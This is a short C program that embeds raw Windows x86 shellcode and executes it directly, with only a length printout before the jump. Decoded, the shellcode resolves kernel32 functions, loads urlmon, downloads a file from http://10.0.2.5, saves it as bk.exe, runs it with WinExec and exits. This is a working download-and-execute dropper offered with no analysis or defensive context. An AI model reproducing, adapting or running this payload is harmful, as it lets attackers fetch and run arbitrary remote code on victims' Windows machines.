#include<stdio.h>
#include<string.h>
char shellcode[]=\

"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x59\x50\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x6f\x6e\x2e\x64\x68\x75\x72\x6c\x6d\x54\xff\x54\x24\x10\x83\xc4\x0c\x50\x31\xc0\x66\xb8\x65\x41\x50\x68\x6f\x46\x69\x6c\x68\x6f\x61\x64\x54\x68\x6f\x77\x6e\x6c\x68\x55\x52\x4c\x44\x54\xff\x74\x24\x18\xff\x54\x24\x24\x83\xc4\x14\x50\x31\xc0\xb8\x78\x65\x63\x23\x50\x83\x6c\x24\x03\x23\x68\x57\x69\x6e\x45\x54\xff\x74\x24\x1c\xff\x54\x24\x1c\x83\xc4\x08\x50\x31\xc0\xb8\x65\x73\x73\x23\x50\x83\x6c\x24\x03\x23\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\xff\x74\x24\x24\xff\x54\x24\x24\x83\xc4\x0c\x50\x31\xc0\xb8\x32\x2e\x35\x23\x50\x83\x6c\x24\x03\x23\x68\x30\x2e\x30\x2e\x68\x3a\x2f\x2f\x31\x68\x68\x74\x74\x70\x54\x31\xc0\x66\xb8\x78\x65\x50\x68\x62\x6b\x2e\x65\x54\x31\xc0\x50\x31\xc0\x50\xff\x74\x24\x08\xff\x74\x24\x18\x31\xc0\x50\xff\x54\x24\x3c\x83\xc4\x20\x31\xc0\x66\xb8\x78\x65\x50\x68\x62\x6b\x2e\x65\x54\x31\xc0\x50\xff\x74\x24\x04\xff\x54\x24\x18\x83\xc4\x0c\x31\xc0\x50\xff\x54\x24\x04";

main()
{
printf("shellcode lenght %ld\n",(long)strlen(shellcode));
(* (int(*)()) shellcode) ();
}